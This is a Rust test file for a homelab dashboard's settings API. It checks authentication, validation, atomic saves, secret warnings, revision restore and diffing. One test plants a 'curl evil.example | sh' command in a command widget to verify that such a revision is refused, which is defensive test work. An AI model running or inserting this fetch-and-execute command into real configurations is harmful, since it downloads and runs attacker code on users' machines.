    assert_eq!(s, StatusCode::FORBIDDEN, "{b}");
    assert!(b["error"].as_str().unwrap().contains("enables"));
    assert_eq!(file(&dir2), off);
    // validate reports the guard too.
    let (s, b) = post(&st2, "config/validate", json!({"text": FIXTURE})).await;
    assert_eq!(s, StatusCode::OK);
    assert_eq!(b["ok"], false);
    assert_eq!(b["locked"], true);

    // Allowed: unrelated edit keeps the command widget.
    let t = FIXTURE.replace("title = \"homelab\"", "title = \"box\"");
    let (s, b) = post(&st, "config", json!({"base_hash": h, "text": t})).await;
    assert_eq!(s, StatusCode::OK, "{b}");
    assert_eq!(b["note"], "raw edit");
    assert_eq!(file(&dir), t);
    assert!(widget_ids(&t).contains(&"procs".to_string()));
    // Allowed: deleting the command widget.
    let start = t.find("[[widgets]]\nid = \"procs\"").unwrap();
    let end = t.find("# Deliberately broken").unwrap();
    let without = format!("{}{}", &t[..start], &t[end..]);
    let (s, b) = post(
        &st,
        "config",
        json!({"base_hash": hash(&t), "text": without}),
    )
    .await;
    assert_eq!(s, StatusCode::OK, "{b}");
    assert!(!widget_ids(&file(&dir)).contains(&"procs".to_string()));
    // And it cannot be put back from the app.
    let (s, _) = post(
        &st,
        "config",
        json!({"base_hash": hash(&without), "text": t}),
    )
    .await;
    assert_eq!(s, StatusCode::FORBIDDEN);
}

// ------------------------------------------------------------ pipeline

#[tokio::test]
async fn unauthenticated_requests_are_refused() {
    let (dir, st) = state_with(Some(FIXTURE));
    for path in [
        "/api/settings/config",
        "/api/settings/general",
        "/api/settings/widgets",
        "/api/settings/notifications",
        "/api/settings/env",
        "/api/settings/revisions",
        "/api/settings/security",
        "/api/settings/nope",
    ] {
        let req = hyper::Request::get(path)
            .body(Full::new(Bytes::new()))
            .unwrap();
        let resp = super::route(&st, req).await;
        assert_eq!(resp.status(), StatusCode::UNAUTHORIZED, "{path}");
        let body = resp.into_body().collect().await.unwrap().to_bytes();
        assert!(!String::from_utf8_lossy(&body).contains("homelab"));
    }
    // Writes are refused by the auth guard as well (defense in depth).
    let body = json!({"base_hash": hash(FIXTURE), "page": {"title": "x"}}).to_string();
    let req = hyper::Request::post("/api/settings/general")
        .body(Full::new(Bytes::from(body)))
        .unwrap();
    let resp = super::route(&st, req).await;
    assert!(resp.status() == StatusCode::FORBIDDEN || resp.status() == StatusCode::UNAUTHORIZED);
    assert_eq!(file(&dir), FIXTURE);
}

#[tokio::test]
async fn invalid_input_is_never_written() {
    let (dir, st) = state_with(Some(FIXTURE));
    let h = hash(FIXTURE);
    let (s, b) = post(
        &st,
        "general",
        json!({"base_hash": h, "page": {"columns": 9}}),
    )
    .await;
    assert_eq!(s, StatusCode::UNPROCESSABLE_ENTITY, "{b}");
    assert_eq!(b["field"], "columns");
    assert_eq!(file(&dir), FIXTURE);

    let bad = FIXTURE.replace("remote = true", "remote = = true");
    let (s, b) = post(&st, "config", json!({"base_hash": h, "text": bad})).await;
    assert_eq!(s, StatusCode::UNPROCESSABLE_ENTITY);
    assert_eq!(b["line"], 10, "{b}");
    assert!(b["col"].as_u64().is_some());
    assert_eq!(file(&dir), FIXTURE);

    let (s, b) = post(&st, "config/validate", json!({"text": bad})).await;
    assert_eq!(s, StatusCode::OK);
    assert_eq!(b["ok"], false);
    assert_eq!(b["line"], 10);
    let (_, b) = post(&st, "config/validate", json!({"text": FIXTURE})).await;
    assert_eq!(b["ok"], true);

    // A widget that does not validate (unknown template field).
    let mut w = mailpit2();
    w["template"] = json!("{{nope}}");
    let (s, b) = post(
        &st,
        "widgets",
        json!({"base_hash": h, "action": "add", "item": w}),
    )
    .await;
    assert_eq!(s, StatusCode::UNPROCESSABLE_ENTITY, "{b}");
    assert_eq!(b["field"], "template");
    assert_eq!(file(&dir), FIXTURE);

    // Malformed JSON and unknown endpoint.
    let (s, _) = call(&st, Method::POST, "general", None).await;
    assert_eq!(s, StatusCode::BAD_REQUEST);
    let (s, _) = get(&st, "nope").await;
    assert_eq!(s, StatusCode::NOT_FOUND);
}

#[tokio::test]
async fn stale_hash_is_refused() {
    let (dir, st) = state_with(Some(FIXTURE));
    let (s, b) = post(
        &st,
        "general",
        json!({"base_hash": "0000", "page": {"title": "x"}}),
    )
    .await;
    assert_eq!(s, StatusCode::CONFLICT);
    assert_eq!(b["error"], "config changed on disk; reload");
    // A hand edit after the form was loaded is never overwritten.
    let (_, g) = get(&st, "general").await;
    let loaded = g["hash"].as_str().unwrap().to_string();
    let hand = FIXTURE.replace("homelab", "hand-edited");
    std::fs::write(dir.join("config.toml"), &hand).unwrap();
    let (s, _) = post(
        &st,
        "general",
        json!({"base_hash": loaded, "page": {"title": "x"}}),
    )
    .await;
    assert_eq!(s, StatusCode::CONFLICT);
    let (s, _) = post(&st, "config", json!({"base_hash": loaded, "text": FIXTURE})).await;
    assert_eq!(s, StatusCode::CONFLICT);
    assert_eq!(file(&dir), hand);
}

#[tokio::test]
async fn save_is_atomic_keeps_mode_and_reloads() {
    use std::os::unix::fs::PermissionsExt;
    let (dir, st) = state_with(Some(FIXTURE));
    let path = dir.join("config.toml");
    std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o640)).unwrap();
    let (s, b) = post(
        &st,
        "general",
        json!({"base_hash": hash(FIXTURE), "page": {"title": "saved"}}),
    )
    .await;
    assert_eq!(s, StatusCode::OK, "{b}");
    assert_eq!(b["ok"], true);
    assert_eq!(b["note"], "general");
    assert_eq!(b["hash"].as_str().unwrap(), hash(&file(&dir)));
    let names: Vec<String> = std::fs::read_dir(&dir)
        .unwrap()
        .map(|e| e.unwrap().file_name().to_string_lossy().into_owned())
        // The history database lives in the data dir too; not a temp file.
        .filter(|n| !n.starts_with("hobnail.db"))
        .collect();
    assert_eq!(names, ["config.toml"], "no temp files left behind");
    let mode = std::fs::metadata(&path).unwrap().permissions().mode() & 0o777;
    assert_eq!(mode, 0o640);
    assert_eq!(st.config.current().page.title.as_deref(), Some("saved"));
    // Same content again: no write.
    let (_, b2) = post(
        &st,
        "general",
        json!({"base_hash": b["hash"], "page": {"title": "saved"}}),
    )
    .await;
    assert_eq!(b2["unchanged"], true);
}

#[test]
fn write_atomic_failure_leaves_target_and_no_temp() {
    let dir = tmp_dir();
    let target = dir.join("sub").join("missing").join("x.toml");
    assert!(doc::write_atomic(&target, b"x", 0o644).is_err());
    let path = dir.join("a.toml");
    std::fs::write(&path, "old").unwrap();
    doc::write_atomic(&path, b"new", 0o644).unwrap();
    assert_eq!(std::fs::read_to_string(&path).unwrap(), "new");
    assert_eq!(std::fs::read_dir(&dir).unwrap().count(), 1);
}

#[tokio::test]
async fn missing_config_file_can_be_created() {
    let (dir, st) = state_with(None);
    let (s, g) = get(&st, "config").await;
    assert_eq!(s, StatusCode::OK);
    assert_eq!(g["exists"], false);
    assert_eq!(g["hash"], hash(""));
    let (s, b) = post(
        &st,
        "bookmarks",
        json!({"base_hash": hash(""), "action": "add",
        "item": {"name": "GitHub", "url": "https://github.com"}}),
    )
    .await;
    assert_eq!(s, StatusCode::OK, "{b}");
    assert_eq!(parse_ok(&file(&dir)).bookmarks.len(), 1);
}

// ------------------------------------------------------------ secrets

#[test]
fn secret_value_warnings() {
    let slack = "[channels.h]\ntype = \"webhook\"\nurl = \"https://hooks.slack.com/services/T000/B000/XXXXXXXXXXXXXXXX\"\n";
    let w = guard::secret_warnings("", slack);
    assert_eq!(w.len(), 1);
    assert!(w[0].starts_with("line 3:"));
    assert!(w[0].contains("Slack"));
    assert!(!w[0].contains("XXXX"), "a warning never repeats the secret");
    // Already there: no new warning.
    assert!(guard::secret_warnings(slack, slack).is_empty());
    // A Telegram bot token, even in a comment.
    let tg = "# token 123456789:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw0\n";
    let w = guard::secret_warnings("", tg);
    assert_eq!(w.len(), 1);
    assert!(w[0].contains("Telegram") && !w[0].contains("AAHdq"));
    // No false positives on the fixture (host:port URLs, durations).
    assert!(guard::secret_warnings("", FIXTURE).is_empty());
    assert!(guard::secret_warnings(
        "",
        "a = \"12:30\"\nb = \"x1234:abcdefghijklmnopqrstuvwxyz0123456789\"\n"
    )
    .is_empty());
}

#[tokio::test]
async fn raw_save_with_a_secret_warns_but_saves() {
    let (dir, st) = state_with(Some(FIXTURE));
    let t = format!("{FIXTURE}\n[channels.h]\ntype = \"webhook\"\nurl = \"https://hooks.slack.com/services/T000/B000/XXXXXXXXXXXXXXXX\"\n");
    let (s, b) = post(
        &st,
        "config",
        json!({"base_hash": hash(FIXTURE), "text": t}),
    )
    .await;
    assert_eq!(s, StatusCode::OK, "{b}");
    assert_eq!(b["warnings"].as_array().unwrap().len(), 1);
    assert!(!b.to_string().contains("XXXXXXXX"));
    assert_eq!(file(&dir), t);
}

#[test]
fn env_var_names() {
    for ok in ["RH_SLACK_WEBHOOK_URL", "_X", "A1", "TOKEN"] {
        assert!(guard::valid_env_name(ok), "{ok}");
    }
    for bad in [
        "",
        "1A",
        "lower",
        "A-B",
        "A B",
        "https://hooks.slack.com/x",
        "A=B",
        "Ä",
    ] {
        assert!(!guard::valid_env_name(bad), "{bad}");
    }
    assert!(!guard::valid_env_name(&"A".repeat(129)));
}

#[tokio::test]
async fn gets_show_env_names_never_values() {
    std::env::set_var("RH_SETTINGS_TEST_SET", "super-secret-value");
    let text = format!(
        "{FIXTURE}\n[channels.slack]\ntype = \"slack\"\nwebhook_url_env = \"RH_SETTINGS_TEST_SET\"\n\n\
         [channels.tg]\ntype = \"telegram\"\ntoken_env = \"RH_SETTINGS_TEST_UNSET\"\nchat_id = 1\n"
    );
    let text = text.replace(
        "enabled = true\nrefresh = \"15s\"",
        "enabled = true\nrefresh = \"15s\"\nenv = { API_KEY = \"hunter2\" }",
    );
    let (_, st) = state_with(Some(&text));
    let (s, n) = get(&st, "notifications").await;
    assert_eq!(s, StatusCode::OK, "{n}");
    let all = n.to_string();
    assert!(!all.contains("super-secret-value"));
    let slack = n["channels"]
        .as_array()
        .unwrap()
        .iter()
        .find(|c| c["id"] == "slack")
        .unwrap();
    assert_eq!(slack["secrets"][0]["name"], "RH_SETTINGS_TEST_SET");
    assert_eq!(slack["secrets"][0]["set"], true);
    let tg = n["channels"]
        .as_array()
        .unwrap()
        .iter()
        .find(|c| c["id"] == "tg")
        .unwrap();
    assert_eq!(tg["secrets"][0]["set"], false);
    let (_, e) = get(&st, "env").await;
    assert!(!e.to_string().contains("super-secret-value"));
    assert_eq!(e["vars"].as_array().unwrap().len(), 2);

    let (s, w) = get(&st, "widgets").await;
    assert_eq!(s, StatusCode::OK, "{w}");
    let procs = w["widgets"]
        .as_array()
        .unwrap()
        .iter()
        .find(|x| x["id"] == "procs")
        .unwrap();
    assert_eq!(procs["locked"], true);
    assert_eq!(procs["item"]["env_names"], json!(["API_KEY"]));
    assert!(!w.to_string().contains("hunter2"));
    let beszel = w["widgets"]
        .as_array()
        .unwrap()
        .iter()
        .find(|x| x["id"] == "beszel")
        .unwrap();
    assert_eq!(beszel["locked"], false);
    assert_eq!(beszel["item"]["url"], "http://100.64.0.10:8090/api/health");
}

// ------------------------------------------------------------ other tabs

#[tokio::test]
async fn gets_return_hash_and_values() {
    let (_, st) = state_with(Some(FIXTURE));
    let h = hash(FIXTURE);
    for path in [
        "general",
        "containers",
        "bookmarks",
        "widgets",
        "notifications",
        "history",
        "config",
        "meta",
    ] {
        let (s, b) = get(&st, path).await;
        assert_eq!(s, StatusCode::OK, "{path}: {b}");
        assert_eq!(b["hash"], h, "{path}");
    }
    let (_, g) = get(&st, "general").await;
    assert_eq!(g["page"]["title"], "homelab");
    assert_eq!(g["defaults"]["columns"], 4);
    let (_, c) = get(&st, "config").await;
    assert_eq!(c["text"], FIXTURE);
    assert_eq!(c["valid"]["ok"], true);
    let (s, r) = get(&st, "revisions").await;
    assert_eq!(s, StatusCode::OK);
    assert!(r["revisions"].is_array());
    let (s, x) = get(&st, "history/export").await;
    assert_eq!(s, StatusCode::OK);
    assert!(x["events"].is_array());
    let (s, sec) = get(&st, "security").await;
    assert_eq!(s, StatusCode::OK);
    assert!(sec["recent_logins"].is_array());
}

#[tokio::test]
async fn form_tabs_refuse_a_broken_file() {
    let broken = "[page\n";
    let (dir, st) = state_with(Some(broken));
    let (s, b) = get(&st, "general").await;
    assert_eq!(s, StatusCode::UNPROCESSABLE_ENTITY);
    assert_eq!(b["file_invalid"], true);
    let (s, _) = post(
        &st,
        "general",
        json!({"base_hash": hash(broken), "page": {"title": "x"}}),
    )
    .await;
    assert_eq!(s, StatusCode::UNPROCESSABLE_ENTITY);
    // The raw editor still works and can fix it.
    let (s, c) = get(&st, "config").await;
    assert_eq!(s, StatusCode::OK);
    assert_eq!(c["valid"]["ok"], false);
    let (s, _) = post(
        &st,
        "config",
        json!({"base_hash": hash(broken), "text": "[page]\n"}),
    )
    .await;
    assert_eq!(s, StatusCode::OK);
    assert_eq!(file(&dir), "[page]\n");
}

#[tokio::test]
async fn custom_css_editor() {
    let (dir, st) = state_with(Some(FIXTURE));
    let (_, g) = get(&st, "appearance").await;
    assert_eq!(g["css"], "");
    let (s, b) = post(
        &st,
        "appearance",
        json!({"base_hash": g["hash"], "css": ":root { --accent: red; }"}),
    )
    .await;
    assert_eq!(s, StatusCode::OK, "{b}");
    assert_eq!(
        std::fs::read_to_string(dir.join("custom.css")).unwrap(),
        ":root { --accent: red; }"
    );
    let (s, _) = post(
        &st,
        "appearance",
        json!({"base_hash": g["hash"], "css": "x"}),
    )
    .await;
    assert_eq!(s, StatusCode::CONFLICT);
    let (s, _) = post(
        &st,
        "appearance",
        json!({"base_hash": b["hash"], "css": "a".repeat(64 * 1024 + 1)}),
    )
    .await;
    assert_eq!(s, StatusCode::PAYLOAD_TOO_LARGE);
    let mut names: Vec<String> = std::fs::read_dir(&dir)
        .unwrap()
        .map(|e| e.unwrap().file_name().to_string_lossy().into_owned())
        // The history database lives in the data dir too; not a temp file.
        .filter(|n| !n.starts_with("hobnail.db"))
        .collect();
    names.sort();
    assert_eq!(names, ["config.toml", "custom.css"]);
}

#[tokio::test]
async fn preview_respects_allow_hosts() {
    let text = "[http]\nallow_hosts = [\"example.invalid\"]\n";
    let (_, st) = state_with(Some(text));
    let item =
        json!({"id": "p", "type": "custom-api", "url": "http://127.0.0.1:9/x", "timeout": "1s"});
    let (s, b) = post(&st, "widgets/preview", json!({"item": item})).await;
    assert_eq!(s, StatusCode::OK, "{b}");
    assert_eq!(b["ok"], false);
    assert!(b["error"].as_str().unwrap().contains("allow_hosts"), "{b}");
    let bad = json!({"id": "p", "type": "custom-api", "url": "ftp://x"});
    let (s, b) = post(&st, "widgets/preview", json!({"item": bad})).await;
    assert_eq!(s, StatusCode::UNPROCESSABLE_ENTITY, "{b}");
    assert_eq!(b["field"], "url");
}

#[tokio::test]
async fn channel_test_needs_a_saved_channel() {
    let (_, st) = state_with(Some(FIXTURE));
    let (s, _) = post(&st, "channels/test", json!({"name": "nope"})).await;
    assert_eq!(s, StatusCode::NOT_FOUND);
}

#[tokio::test]
async fn history_writes_go_through_the_validator() {
    // `[history]` is validated by config::parse (its keys come from the
    // storage work); whatever it refuses is never written.
    let (dir, st) = state_with(Some(FIXTURE));
    let (s, b) = post(
        &st,
        "history",
        json!({"base_hash": hash(FIXTURE), "history": {"no_such_key": 1}}),
    )
    .await;
    assert_eq!(s, StatusCode::UNPROCESSABLE_ENTITY, "{b}");
    assert_eq!(file(&dir), FIXTURE);
    let (s, b) = post(&st, "history/clear", json!({})).await;
    assert_eq!(s, StatusCode::OK, "{b}");
}

// ------------------------------------------------------------ revisions

/// Revisions need the real database (storage work). Skipped while
/// `Db::open_in_memory()` is the disabled stub.
fn state_with_db(text: &str) -> Option<(PathBuf, Arc<AppState>)> {
    let (dir, mut st) = state_with(Some(text));
    let db = crate::db::Db::open_in_memory().ok()?;
    if !db.is_enabled() {
        eprintln!("skipped: the history database is a disabled stub");
        return None;
    }
    Arc::get_mut(&mut st)?.db = Arc::new(db);
    Some((dir, st))
}

#[tokio::test]
async fn revisions_record_restore_and_diff() {
    let Some((dir, st)) = state_with_db(FIXTURE) else {
        return;
    };
    let h0 = hash(FIXTURE);
    let (s, b) = post(
        &st,
        "general",
        json!({"base_hash": h0, "page": {"title": "one"}}),
    )
    .await;
    assert_eq!(s, StatusCode::OK, "{b}");
    let first = b["revision"].as_i64().expect("revision id");
    let (_, r) = get(&st, "revisions").await;
    let list = r["revisions"].as_array().unwrap();
    assert_eq!(list.len(), 2, "{r}");
    assert_eq!(list[0]["note"], "general");
    assert_eq!(list[1]["note"], "before first in-app edit");
    let orig = list[1]["id"].as_i64().unwrap();
    let (_, t) = get(&st, &format!("revision/{orig}")).await;
    assert_eq!(t["text"], FIXTURE);
    let (_, d) = get(&st, &format!("revision/{orig}/diff")).await;
    assert_eq!(
        (d["added"].as_u64(), d["removed"].as_u64()),
        (Some(1), Some(1)),
        "{d}"
    );
    // Restore creates a new revision.
    let h1 = hash(&file(&dir));
    let (s, b) = post(
        &st,
        &format!("revision/{orig}/restore"),
        json!({"base_hash": h1}),
    )
    .await;
    assert_eq!(s, StatusCode::OK, "{b}");
    assert_eq!(b["note"], format!("restored #{orig}"));
    assert!(b["revision"].as_i64().unwrap() > first);
    assert_eq!(file(&dir), FIXTURE);
    // Stale restore refused.
    let (s, _) = post(
        &st,
        &format!("revision/{first}/restore"),
        json!({"base_hash": h1}),
    )
    .await;
    assert_eq!(s, StatusCode::CONFLICT);
}

#[tokio::test]
async fn restoring_a_revision_with_another_command_widget_is_refused() {
    let Some((dir, st)) = state_with_db(FIXTURE) else {
        return;
    };
    let evil = FIXTURE.replace("printf", "curl evil.example | sh; printf");
    let id = st.db.add_revision(1, "file", "old", &evil).unwrap();
    let (s, b) = post(
        &st,
        &format!("revision/{id}/restore"),
        json!({"base_hash": hash(FIXTURE)}),
    )
    .await;
    assert_eq!(s, StatusCode::FORBIDDEN, "{b}");
    assert_eq!(file(&dir), FIXTURE);
}

#[tokio::test]
async fn revision_endpoints_without_a_database() {
    let (_, st) = state_with(Some(FIXTURE));
    if st.db.is_enabled() {
        return;
    }
    let (s, _) = get(&st, "revision/1").await;
    assert_eq!(s, StatusCode::NOT_FOUND);
    let (s, _) = post(
        &st,
        "revision/1/restore",
        json!({"base_hash": hash(FIXTURE)}),
    )
    .await;
    assert_eq!(s, StatusCode::NOT_FOUND);
    let (s, _) = get(&st, "revision/x").await;
    assert_eq!(s, StatusCode::BAD_REQUEST);
}

// ------------------------------------------------------------ diff

fn lcs_len(a: &[u8], b: &[u8]) -> usize {
    let mut dp = vec![vec![0usize; b.len() + 1]; a.len() + 1];
    for i in 0..a.len() {
        for j in 0..b.len() {
            dp[i + 1][j + 1] = if a[i] == b[j] {
                dp[i][j] + 1
            } else {
                dp[i][j + 1].max(dp[i + 1][j])
            };
        }
    }
    dp[a.len()][b.len()]
}

/// Apply an edit script: the result must be `b`, and the old indices in
/// order must cover `a`.
fn check_script(a: &[u8], b: &[u8], ops: &[diff::Op]) {
    let mut out = Vec::new();
    let (mut ai, mut bi) = (0, 0);
    for o in ops {
        match *o {
            diff::Op::Eq(x, y) => {
                assert_eq!((x, y), (ai, bi));
                assert_eq!(a[x], b[y]);
                out.push(b[y]);
                ai += 1;
                bi += 1;
            }
            diff::Op::Del(x) => {
                assert_eq!(x, ai);
                ai += 1;
            }
            diff::Op::Ins(y) => {
                assert_eq!(y, bi);
                out.push(b[y]);
                bi += 1;
            }
        }
    }
    assert_eq!((ai, bi), (a.len(), b.len()));
    assert_eq!(out, b);
}

#[test]
fn diff_is_correct_and_minimal() {
    // Deterministic pseudo-random inputs over a tiny alphabet.
    let mut seed = 0x2545_f491_4f6c_dd1du64;
    let mut next = || {
        seed ^= seed << 13;
        seed ^= seed >> 7;
        seed ^= seed << 17;
        seed
    };
    for _ in 0..400 {
        let la = (next() % 14) as usize;
        let lb = (next() % 14) as usize;
        let a: Vec<u8> = (0..la).map(|_| b'a' + (next() % 3) as u8).collect();
        let b: Vec<u8> = (0..lb).map(|_| b'a' + (next() % 3) as u8).collect();
        let (ops, approx) = diff::diff(&a, &b);
        assert!(!approx);
        check_script(&a, &b, &ops);
        let eq = ops.iter().filter(|o| matches!(o, diff::Op::Eq(..))).count();
        assert_eq!(eq, lcs_len(&a, &b), "{:?} {:?}", a, b);
    }
}

#[test]
fn diff_falls_back_when_too_different() {
    let a: Vec<u32> = (0..1500).collect();
    let b: Vec<u32> = (2000..3500).collect();
    let (ops, approx) = diff::diff(&a, &b);
    assert!(approx);
    assert_eq!(ops.len(), 3000);
}

#[test]
fn diff_hunks() {
    let old = "a\nb\nc\nd\ne\nf\ng\nh\ni\nj\nk\n";
    let new = "a\nB\nc\nd\ne\nf\ng\nh\ni\nj\nk\nl\n";
    let v = diff::hunks_json(old, new);
    assert_eq!(v["added"], 2);
    assert_eq!(v["removed"], 1);
    let hunks = v["hunks"].as_array().unwrap();
    assert_eq!(hunks.len(), 2, "{v}");
    assert_eq!(hunks[0]["old_start"], 1);
    assert_eq!(hunks[0]["lines"][1], json!({"op": "-", "text": "b"}));
    assert_eq!(hunks[0]["lines"][2], json!({"op": "+", "text": "B"}));
    assert_eq!(hunks[1]["new_start"], 9);
    assert_eq!(
        hunks[1]["lines"].as_array().unwrap().last().unwrap()["text"],
        "l"
    );
    let same = diff::hunks_json(old, old);
    assert_eq!(same["hunks"], json!([]));
    let from_empty = diff::hunks_json("", "x\n");
    assert_eq!(from_empty["hunks"][0]["old_start"], 0);
    assert_eq!(from_empty["hunks"][0]["new_start"], 1);
}

#[test]
fn diff_endpoint_caps_input() {
    let big = "x\n".repeat(diff::MAX_LINES + 1);
    let e = api::diff_json(&big, "", 1).unwrap_err();
    assert_eq!(e.status, StatusCode::PAYLOAD_TOO_LARGE);
    assert_eq!(
        api::diff_json("a\n", "b\n", 3).unwrap()["to"],
        "revision #3"
    );
}

// ------------------------------------------------------------ small parts

#[test]
fn error_splitting_and_fields() {
    assert_eq!(
        store::split_error("config.toml:3:7: expected `=`"),
        ("expected `=`".to_string(), Some((3, 7)))
    );
    assert_eq!(
        store::split_error("config.toml: page.columns must be 1..=6, got 9"),
        ("page.columns must be 1..=6, got 9".to_string(), None)
    );
    let f = |m: &str| store::field_in(m, ops::WIDGET_KEYS);
    assert_eq!(
        f("widget \"x\": url must be a valid http:// or https:// URL").as_deref(),
        Some("url")
    );
    assert_eq!(
        f("widget \"x\": refresh must be at least 1s").as_deref(),
        Some("refresh")
    );
    assert_eq!(f("nothing here"), None);
    assert_eq!(
        store::field_in("headers_env.X must be", ops::WIDGET_KEYS).as_deref(),
        Some("headers_env")
    );
}

#[test]
fn percent_decoding() {
    assert_eq!(super::percent_decode("odoo%2Dup"), "odoo-up");
    assert_eq!(super::percent_decode("a%2"), "a%2");
    assert_eq!(super::percent_decode("%zz"), "%zz");
    assert_eq!(super::percent_decode("%C3%A4"), "ä");
}

#[test]
fn log_match_rules_can_be_added_from_the_form() {
    let req = list_req(
        "add",
        None,
        Some(
            json!({"name": "errs", "type": "log_match", "pattern": "ERROR", "containers": ["web"], "count": 3, "window": "5m"}),
        ),
        None,
    );
    let d = ops::list_action(&cur(FIXTURE), &ops::ALERTS, &req).unwrap();
    let c = parse_ok(&d.text);
    assert!(c.alerts.iter().any(|r| r.name == "errs"));
}
